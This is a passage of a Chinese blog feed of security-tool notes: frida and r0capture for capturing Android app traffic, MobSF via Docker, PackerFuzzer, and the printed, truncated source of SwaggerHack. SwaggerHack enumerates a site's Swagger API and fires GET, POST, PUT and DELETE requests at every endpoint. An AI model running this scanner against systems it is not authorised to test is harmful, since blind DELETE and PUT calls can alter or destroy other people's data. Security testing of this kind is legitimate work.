title="根据Android架构和Client版本下载对应版本的Server"></a>根据Android架构和Client版本下载对应版本的Server</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">wget https://github.com/frida/frida/releases/download/16.3.3/frida-server-16.3.3-linux-x86.xz</span><br><span class="line">xz -dk frida-server-16.3.3-linux-x86.xz</span><br></pre></td></tr></table></figure><h3 id="在Android上启动Server"><a href="#在Android上启动Server" class="headerlink" title="在Android上启动Server"></a>在Android上启动Server</h3><h4 id="复制Server到Android上"><a href="#复制Server到Android上" class="headerlink" title="复制Server到Android上"></a>复制Server到Android上</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">adb push frida-server-16.3.3-linux-x86 /data/local/tmp/frida-server-16.3.3-linux-x86</span><br></pre></td></tr></table></figure><h4 id="添加可执行权限"><a href="#添加可执行权限" class="headerlink" title="添加可执行权限"></a>添加可执行权限</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">adb shell chmod 755 /data/local/tmp/frida-server-16.3.3-linux-x86</span><br></pre></td></tr></table></figure><h4 id="运行Server"><a href="#运行Server" class="headerlink" title="运行Server"></a>运行Server</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">adb shell /data/local/tmp/frida-server-16.3.3-linux-x86</span><br></pre></td></tr></table></figure><h3 id="将Android的TCP端口转发到PS的TCP端口"><a href="#将Android的TCP端口转发到PS的TCP端口" class="headerlink" title="将Android的TCP端口转发到PS的TCP端口"></a>将Android的TCP端口转发到PS的TCP端口</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">adb forward tcp:27042 tcp:27042</span><br></pre></td></tr></table></figure><h3 id="在PC上测试Server与Client的连接状态"><a href="#在PC上测试Server与Client的连接状态" class="headerlink" title="在PC上测试Server与Client的连接状态"></a>在PC上测试Server与Client的连接状态</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">frida-ps -U</span><br><span class="line">frida-ps -R</span><br></pre></td></tr></table></figure><ul><li>如果两条命令都有进程信息说明连接成功</li></ul><h2 id="r0capture环境配置"><a href="#r0capture环境配置" class="headerlink" title="r0capture环境配置"></a>r0capture环境配置</h2><ul><li>安卓应用层抓包通杀脚本（<a href="https://github.com/r0ysue/r0capture">Github</a>）</li><li>用于抓Android的TCP包，并存储为Wireshark文件</li></ul><h3 id="下载项目-1"><a href="#下载项目-1" class="headerlink" title="下载项目"></a>下载项目</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">git clone https://github.com/r0ysue/r0capture.git</span><br><span class="line">cd r0capture</span><br></pre></td></tr></table></figure><h3 id="抓包并输出到文件"><a href="#抓包并输出到文件" class="headerlink" title="抓包并输出到文件"></a>抓包并输出到文件</h3><ul><li>抓包前无需在Android上启动app，会在命令执行成功后自动打开app</li></ul><blockquote><p><code>&lt;package_name&gt;</code>：apk的全局限定名<br><code>-p &lt;file_name&gt;.pcap</code>：保存抓包数据到文件</p></blockquote><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 r0capture.py -U -f &lt;package_name&gt; -v -p &lt;file_name&gt;.pcap</span><br></pre></td></tr></table></figure><ul><li>抓包完成后，关闭app</li><li>在Wireshark导入抓包数据并分析</li></ul><h2 id="完成"><a href="#完成" class="headerlink" title="完成"></a>完成</h2>]]></content>
    
    
    <summary type="html">&lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h2&gt;&lt;p&gt;利用&lt;a href=&quot;/302.html?target=https://github.com/frida/frida&quot;&gt;frida&amp;#x2F;frida&lt;/a&gt;和&lt;a href=&quot;https://github.com/r0ysue/r0capture&quot;&gt;r0ysue&amp;#x2F;r0capture&lt;/a&gt;实现Android四层协议和五层协议抓包&lt;/p&gt;</summary>
    
    
    
    
    <category term="Github" scheme="https://loli.fj.cn/tags/Github/"/>
    
    <category term="Android" scheme="https://loli.fj.cn/tags/Android/"/>
    
  </entry>
  
  <entry>
    <title>【笔记】通过Docker部署MobSF</title>
    <link href="https://loli.fj.cn/2024/06/28/%E9%80%9A%E8%BF%87Docker%E9%83%A8%E7%BD%B2MobSF/"/>
    <id>https://loli.fj.cn/2024/06/28/%E9%80%9A%E8%BF%87Docker%E9%83%A8%E7%BD%B2MobSF/</id>
    <published>2024-06-28T10:03:36.000Z</published>
    <updated>2024-07-01T10:30:29.761Z</updated>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>通过Docker部署<a href="/302.html?target=https://github.com/MobSF/Mobile-Security-Framework-MobSF">MobSF</a>实现移动安全分析平台</p><span id="more"></span><h2 id="通过Docker部署"><a href="#通过Docker部署" class="headerlink" title="通过Docker部署"></a>通过Docker部署</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker run -d --name mobsf -p 8000:8000 opensecurity/mobile-security-framework-mobsf:latest</span><br></pre></td></tr></table></figure><h2 id="完成"><a href="#完成" class="headerlink" title="完成"></a>完成</h2><ul><li>截图纪念</li></ul><p><img src="/images/20240628100336/01.webp"></p>]]></content>
    
    
    <summary type="html">&lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h2&gt;&lt;p&gt;通过Docker部署&lt;a href=&quot;/302.html?target=https://github.com/MobSF/Mobile-Security-Framework-MobSF&quot;&gt;MobSF&lt;/a&gt;实现移动安全分析平台&lt;/p&gt;</summary>
    
    
    
    
    <category term="Github" scheme="https://loli.fj.cn/tags/Github/"/>
    
    <category term="Android" scheme="https://loli.fj.cn/tags/Android/"/>
    
    <category term="Docker" scheme="https://loli.fj.cn/tags/Docker/"/>
    
  </entry>
  
  <entry>
    <title>【笔记】PackerFuzzer学习笔记</title>
    <link href="https://loli.fj.cn/2024/06/27/PackerFuzzer%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
    <id>https://loli.fj.cn/2024/06/27/PackerFuzzer%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/</id>
    <published>2024-06-27T12:00:12.000Z</published>
    <updated>2024-07-01T10:30:29.701Z</updated>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>一款针对Webpack等前端打包工具所构造的网站进行快速、高效安全检测的扫描工具（<a href="/302.html?target=https://github.com/rtcatc/Packer-Fuzzer">Github</a>）</p><span id="more"></span><h2 id="下载项目"><a href="#下载项目" class="headerlink" title="下载项目"></a>下载项目</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">git clone https://github.com/rtcatc/Packer-Fuzzer.git</span><br><span class="line">cd Packer-Fuzzer</span><br></pre></td></tr></table></figure><h2 id="下载依赖"><a href="#下载依赖" class="headerlink" title="下载依赖"></a>下载依赖</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">python3 -m venv venv</span><br><span class="line">source venv/bin/activate</span><br><span class="line">pip3 install -r requirements.txt</span><br></pre></td></tr></table></figure><h2 id="测试JS中的信息泄漏"><a href="#测试JS中的信息泄漏" class="headerlink" title="测试JS中的信息泄漏"></a>测试JS中的信息泄漏</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 PackerFuzzer.py -u &lt;url&gt;</span><br></pre></td></tr></table></figure><h2 id="完成"><a href="#完成" class="headerlink" title="完成"></a>完成</h2>]]></content>
    
    
    <summary type="html">&lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h2&gt;&lt;p&gt;一款针对Webpack等前端打包工具所构造的网站进行快速、高效安全检测的扫描工具（&lt;a href=&quot;/302.html?target=https://github.com/rtcatc/Packer-Fuzzer&quot;&gt;Github&lt;/a&gt;）&lt;/p&gt;</summary>
    
    
    
    
    <category term="Github" scheme="https://loli.fj.cn/tags/Github/"/>
    
  </entry>
  
  <entry>
    <title>【笔记】SwaggerHack学习笔记</title>
    <link href="https://loli.fj.cn/2024/06/27/SwaggerHack%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
    <id>https://loli.fj.cn/2024/06/27/SwaggerHack%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/</id>
    <published>2024-06-27T11:37:38.000Z</published>
    <updated>2024-07-01T10:30:29.717Z</updated>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>批量测试Swagger中出现的API接口</p><span id="more"></span><h2 id="下载项目"><a href="#下载项目" class="headerlink" title="下载项目"></a>下载项目</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">git clone https://github.com/jayus0821/swagger-hack.git</span><br><span class="line">cd swagger-hack</span><br></pre></td></tr></table></figure><h3 id="源代码"><a href="#源代码" class="headerlink" title="源代码"></a>源代码</h3><figure class="highlight python"><figcaption><span>swagger-hack.py</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> json</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> csv,numpy.compat.setup</span><br><span class="line"> </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">banner</span>():</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">                                              _                _    </span></span><br><span class="line"><span class="string"> _____      ____ _  __ _  __ _  ___ _ __     | |__   __ _  ___| | __</span></span><br><span class="line"><span class="string">/ __\ \ /\ / / _` |/ _` |/ _` |/ _ \ &#x27;__|____| &#x27;_ \ / _` |/ __| |/ /</span></span><br><span class="line"><span class="string">\__ \\ V  V / (_| | (_| | (_| |  __/ | |_____| | | | (_| | (__|   &lt; </span></span><br><span class="line"><span class="string">|___/ \_/\_/ \__,_|\__, |\__, |\___|_|       |_| |_|\__,_|\___|_|\_\\</span></span><br><span class="line"><span class="string">                   |___/ |___/                                      </span></span><br><span class="line"><span class="string">                                                            by jayus</span></span><br><span class="line"><span class="string">    &#x27;&#x27;&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_specs</span>(<span class="params">url</span>):<span class="comment">#获取标准列表</span></span><br><span class="line">    specs_url = url + <span class="string">&quot;/swagger-resources&quot;</span></span><br><span class="line">    res = requests.get(url = specs_url)</span><br><span class="line">    <span class="comment">#print(res.text)</span></span><br><span class="line">    specs = json.loads(res.text)</span><br><span class="line">    <span class="comment"># for spec in specs:</span></span><br><span class="line">    <span class="comment">#     print(spec)#&#123;&#x27;name&#x27;: &#x27;kt-research-biz&#x27;, &#x27;url&#x27;: &#x27;/research/v2/api-docs&#x27;, &#x27;swaggerVersion&#x27;: &#x27;2.0&#x27;, &#x27;location&#x27;: &#x27;/research/v2/api-docs&#x27;&#125;</span></span><br><span class="line">    <span class="keyword">return</span> specs</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">check_spec</span>(<span class="params">spec_url,url,f</span>):<span class="comment">#前一个是接口文档，用于分析，后一个是文档对应的实际接口请求地址</span></span><br><span class="line">    res = requests.get(url = spec_url)</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        paths = json.loads(res.text)[<span class="string">&#x27;paths&#x27;</span>]</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;[+] : 此标准下共有 %d 个接口&quot;</span>%(<span class="built_in">len</span>(paths)))</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;此标准为空&quot;</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> path <span class="keyword">in</span> paths:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;[+] : 开始测试接口 %s &quot;</span> %(path))</span><br><span class="line">        methods = paths[path]</span><br><span class="line">        <span class="keyword">for</span> method <span class="keyword">in</span> methods:</span><br><span class="line">            <span class="comment">#print(&quot;接口请求方式: &quot;,method)#get/post/put...</span></span><br><span class="line">            <span class="comment">#print( paths[path][method])#对应method的配置信息</span></span><br><span class="line">            tags = paths[path][method][<span class="string">&#x27;tags&#x27;</span>][<span class="number">0</span>]</span><br><span class="line">            summary = paths[path][method][<span class="string">&#x27;summary&#x27;</span>]</span><br><span class="line">            <span class="comment">#print(&quot;接口summary: &quot;,summary)</span></span><br><span class="line">            operationId = paths[path][method][<span class="string">&#x27;operationId&#x27;</span>]</span><br><span class="line">            <span class="keyword">if</span> <span class="string">&#x27;consumes&#x27;</span> <span class="keyword">in</span> paths[path][method].keys():<span class="comment">#json格式</span></span><br><span class="line">                consumes = paths[path][method][<span class="string">&#x27;consumes&#x27;</span>][<span class="number">0</span>]</span><br><span class="line">                <span class="comment">#print(consumes)</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                consumes = <span class="string">&#x27;0&#x27;</span></span><br><span class="line">                </span><br><span class="line">            <span class="keyword">if</span> consumes != <span class="string">&#x27;0&#x27;</span>:<span class="comment">#如果是json格式传输  post/put #post和post都是发送的json，但是接口文档并没有如何构造json的参数，目前只是随便发送一个</span></span><br><span class="line">                <span class="comment">#print(&quot;使用json格式传输&quot;)</span></span><br><span class="line">                <span class="comment"># json_array = &#123;&#125;</span></span><br><span class="line">                <span class="comment"># if &#x27;parameters&#x27; in paths[path][method]:</span></span><br><span class="line">                <span class="comment">#     parameters = paths[path][method][&#x27;parameters&#x27;]</span></span><br><span class="line">                <span class="comment">#     print(&quot;接口参数个数为 %d&quot;%(len(parameters)))</span></span><br><span class="line">                <span class="comment">#     for parameter in parameters:</span></span><br><span class="line">                <span class="comment">#         #print(parameter)</span></span><br><span class="line">                <span class="comment">#         if parameter[&#x27;type&#x27;] == &quot;boolean&quot;:#布尔型全为true，string和数字全部为1</span></span><br><span class="line">                <span class="comment">#             json_array[parameter[&#x27;name&#x27;]] = &#x27;true&#x27;</span></span><br><span class="line">                <span class="comment">#         else:</span></span><br><span class="line">                <span class="comment">#             json_array[parameter[&#x27;name&#x27;]] = &#x27;1&#x27;</span></span><br><span class="line">                <span class="comment"># else:</span></span><br><span class="line">                <span class="comment">#     json_array = &#x27;&#x27;</span></span><br><span class="line">                <span class="comment">#     print(&quot;接口参数个数为 %d&quot;%(0))</span></span><br><span class="line">                </span><br><span class="line">                <span class="comment"># print(&quot;构造请求参数...&quot;)</span></span><br><span class="line">                <span class="comment"># json_string = json.dumps(json_array)</span></span><br><span class="line">                <span class="comment"># print(json_string)</span></span><br><span class="line"></span><br><span class="line">                json_string = <span class="string">&#x27;&#x27;&#x27;&#123;</span></span><br><span class="line"><span class="string">  &quot;contractNumber&quot;: &quot;string&quot;,</span></span><br><span class="line"><span class="string">  &quot;createdBy&quot;: &quot;string&quot;,</span></span><br><span class="line"><span class="string">  &quot;createdTime&quot;: &quot;2021-02-01T09:33:58.398Z&quot;,</span></span><br><span class="line"><span class="string">  &quot;cutoffDate&quot;: &quot;2021-02-01T09:33:58.398Z&quot;,</span></span><br><span class="line"><span class="string">  &quot;delFlag&quot;: &quot;string&quot;,</span></span><br><span class="line"><span class="string">  &quot;dispatchForm&quot;: &quot;string&quot;,</span></span><br><span class="line"><span class="string">  &quot;dispatchUnit&quot;: &quot;string&quot;,</span></span><br><span class="line"><span class="string">  &quot;effectDate&quot;: &quot;2021-02-01T09:33:58.398Z&quot;,</span></span><br><span class="line"><span class="string">  &quot;fileList&quot;: &quot;string&quot;,</span></span><br><span class="line"><span class="string">  &quot;id&quot;: 0,</span></span><br><span class="line"><span class="string">  &quot;makeDate&quot;: &quot;2021-02-01T09:33:58.398Z&quot;,</span></span><br><span class="line"><span class="string">  &quot;manageMethod&quot;: &quot;string&quot;,</span></span><br><span class="line"><span class="string">  &quot;name&quot;: &quot;string&quot;,</span></span><br><span class="line"><span class="string">  &quot;peopleNumber&quot;: &quot;string&quot;,</span></span><br><span class="line"><span class="string">  &quot;remark&quot;: &quot;string&quot;,</span></span><br><span class="line"><span class="string">  &quot;title&quot;: &quot;string&quot;,</span></span><br><span class="line"><span class="string">  &quot;updatedBy&quot;: &quot;string&quot;,</span></span><br><span class="line"><span class="string">  &quot;updatedTime&quot;: &quot;2021-02-01T09:33:58.398Z&quot;</span></span><br><span class="line"><span class="string">&#125;&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">                <span class="keyword">if</span> method == <span class="string">&quot;post&quot;</span>:</span><br><span class="line">                    res = requests.post(url = url + path , data = json_string)</span><br><span class="line">                <span class="keyword">elif</span> method == <span class="string">&quot;put&quot;</span>:</span><br><span class="line">                    res = requests.put(url = url + path , data = json_string)</span><br><span class="line">                <span class="comment"># print(method)</span></span><br><span class="line">                <span class="comment"># print(url + path)</span></span><br><span class="line">                <span class="comment"># print(res.status_code)</span></span><br><span class="line">                <span class="keyword">try</span>:<span class="comment">#post居然也可能没参数</span></span><br><span class="line">                    row = [spec_url,summary,path,method,consumes,url + path,<span class="built_in">str</span>(<span class="built_in">len</span>(paths[path][method][<span class="string">&#x27;parameters&#x27;</span>])),json_string,res.status_code,res.text]</span><br><span class="line">                <span class="keyword">except</span>:</span><br><span class="line">                    row = [spec_url,summary,path,method,consumes,url + path,<span class="string">&#x27;0&#x27;</span>,json_string,res.status_code,res.text]</span><br><span class="line">                writer.writerow(row)</span><br><span class="line">                </span><br><span class="line"></span><br><span class="line">            <span class="keyword">else</span>:<span class="comment">#不是json传输 </span></span><br><span class="line">                <span class="comment"># print(&quot;不使用json格式传输&quot;)</span></span><br><span class="line">                <span class="keyword">if</span> <span class="string">&quot;&#123;&quot;</span> <span class="keyword">in</span> path:</span><br><span class="line">                    <span class="comment"># print(&quot;parameter in url&quot;)</span></span><br><span class="line">                    parameter = paths[path][method][<span class="string">&#x27;parameters&#x27;</span>][<span class="number">0</span>]</span><br><span class="line">                    <span class="keyword">try</span>:</span><br><span class="line">                        <span class="keyword">if</span> parameter[<span class="string">&#x27;type&#x27;</span>] == <span class="string">&quot;boolean&quot;</span>:<span class="comment">#布尔型全为true，string和数字全部为1</span></span><br><span class="line">                            tmp = <span class="string">&quot;true&quot;</span></span><br><span class="line">                        <span class="keyword">else</span>:</span><br><span class="line">                            tmp = <span class="string">&quot;1&quot;</span></span><br><span class="line">                    <span class="keyword">except</span>:</span><br><span class="line">                        <span class="comment"># print(&quot;no type&quot;)</span></span><br><span class="line">                        tmp = <span class="string">&quot;&#123;1&#125;&quot;</span></span><br><span class="line">                    <span class="keyword">if</span> method == <span class="string">&#x27;get&#x27;</span>:</span><br><span class="line">                        res = requests.get(url = url + path[:path.index(<span class="string">&#x27;&#123;&#x27;</span>)] + tmp)</span><br><span class="line">                        <span class="comment"># print(method)</span></span><br><span class="line">                    <span class="keyword">elif</span> method == <span class="string">&#x27;delete&#x27;</span>:</span><br><span class="line">                        res = requests.delete(url = url + path[:path.index(<span class="string">&#x27;&#123;&#x27;</span>)] + tmp)</span><br><span class="line">                        <span class="comment"># print(method)</span></span><br><span class="line">                    <span class="comment"># print(url + path[:path.index(&#x27;&#123;&#x27;)] + tmp)</span></span><br><span class="line">                    <span class="comment"># print(res.status_code)</span></span><br><span class="line"></span><br><span class="line">                    row = [spec_url,summary,path,method,consumes,url + path[:path.index(<span class="string">&#x27;&#123;&#x27;</span>)],<span class="built_in">str</span>(<span class="built_in">len</span>(paths[path][method][<span class="string">&#x27;parameters&#x27;</span>])),<span class="string">&quot;&quot;</span>,res.status_code,res.text]</span><br><span class="line">                    writer.writerow(row)</span><br><span class="line"></span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    query_string = <span class="string">&#x27;&#x27;</span></span><br><span class="line">                    <span class="keyword">if</span> <span class="string">&#x27;parameters&#x27;</span> <span class="keyword">in</span> paths[path][method]:</span><br><span class="line">                        parameters = paths[path][method][<span class="string">&#x27;parameters&#x27;</span>]</span><br><span class="line">                        num_of_param = <span class="built_in">len</span>(parameters)</span><br><span class="line">                        <span class="comment"># print(&quot;接口参数个数为 %d&quot;%(len(parameters)))</span></span><br><span class="line">                        <span class="keyword">for</span> parameter <span class="keyword">in</span> parameters:</span><br><span class="line">                            <span class="comment">#print(parameter)</span></span><br><span class="line">                            <span class="keyword">try</span>:</span><br><span class="line">                                <span class="keyword">if</span> parameter[<span class="string">&#x27;type&#x27;</span>] == <span class="string">&quot;boolean&quot;</span>:<span class="comment">#布尔型全为true，string和数字全部为1</span></span><br><span class="line">                                    query_string += <span class="string">&quot;&amp;%s=true&quot;</span>%(parameter[<span class="string">&#x27;name&#x27;</span>])</span><br><span class="line">                                <span class="keyword">else</span>:</span><br><span class="line">                                    query_string += <span class="string">&quot;&amp;%s=1&quot;</span>%(parameter[<span class="string">&#x27;name&#x27;</span>])</span><br><span class="line">                            <span class="keyword">except</span>:</span><br><span class="line">                                <span class="comment"># print(&quot;no type...&quot;)</span></span><br><span class="line">                                query_string += <span class="string">&quot;&amp;%s=&#123;1&#125;&quot;</span>%(parameter[<span class="string">&#x27;name&#x27;</span>])</span><br><span class="line">                    <span class="keyword">else</span>:</span><br><span class="line">                        query_string = <span class="string">&#x27;&#x27;</span></span><br><span class="line">                        num_of_param = <span class="number">0</span></span><br><span class="line">                        <span class="comment"># print(&quot;接口参数个数为 %d&quot;%(0))</span></span><br><span class="line">                    <span class="comment"># print(&quot;构造请求参数...&quot;)</span></span><br><span class="line">                    query_string = query_string[<span class="number">1</span>:]</span><br><span class="line">                    <span class="comment"># print(query_string)</span></span><br><span class="line"></span><br><span class="line">                    <span class="keyword">if</span> method == <span class="string">&quot;get&quot;</span>:</span><br><span class="line">                        res = requests.get(url = url + path + <span class="string">&quot;?&quot;</span> + query_string)</span><br><span class="line">                        <span class="comment"># print(method)</span></span><br><span class="line">                    <span class="keyword">elif</span> method == <span class="string">&quot;delete&quot;</span>:</span><br><span class="line">                        res = requests.delete(url = url + path + <span class="string">&quot;?&quot;</span> + query_string)</span><br><span class="line">                    <span class="comment">#     print(method)</span></span><br><span class="line">                    <span class="comment"># print(url + path + query_string)</span></span><br><span class="line">                    <span class="comment"># print(res.status_code)</span></span><br><span class="line"></span><br><span class="line">                    row = [spec_url,summary,path,method,consumes,url + path + <span class="string">&quot;?&quot;</span> + query_string,<span class="built_in">str</span>(num_of_param),<span class="string">&quot;&quot;</span>,res.status_code,res.text]</span><br><span class="line">                    writer.writerow(row)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="comment"># print(&quot;================&quot;)</span></span><br><span class="line">        <span class="comment"># print()</span></span><br><span class="line"></span><br><span class="line">        time.sleep(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    banner()</span><br><span class="line">    url = <span class="string">&quot;https://xx.xx.xx&quot;</span><span class="comment">#eg:https://xx.xx.xx/swagger-ui.html 只取前面host部分</span></span><br><span class="line">    specs = get_specs(url)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;[+] 共抓取到 %d 个标准&quot;</span>%(<span class="built_in">len</span>(specs)))</span><br><span class="line"></span><br><span class="line">    f = <span class="built_in">open</span>(<span class="string">&#x27;swagger.csv&#x27;</span>,<span class="string">&#x27;w&#x27;</span>,newline=<span class="string">&#x27;&#x27;</span>,encoding=<span class="string">&#x27;utf-8&#x27;</span>)<span class="comment">#写到csv中</span></span><br><span class="line">    writer = csv.writer(f)</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        writer.writerow([<span class="string">&quot;标准&quot;</span>,<span class="string">&quot;summary&quot;</span>,<span class="string">&quot;path&quot;</span>,<span class="string">&quot;method&quot;</span>,<span class="string">&quot;consumes&quot;</span>,<span class="string">&quot;url&quot;</span>,<span class="string">&quot;num of params&quot;</span>,<span class="string">&quot;data&quot;</span>,<span class="string">&quot;status_code&quot;</span>,<span class="string">&quot;response&quot;</span>])</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        <span class="built_in">print</span>(e)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> spec <span class="keyword">in</span> specs:</span><br><span class="line">        spec_url = url + spec[<span 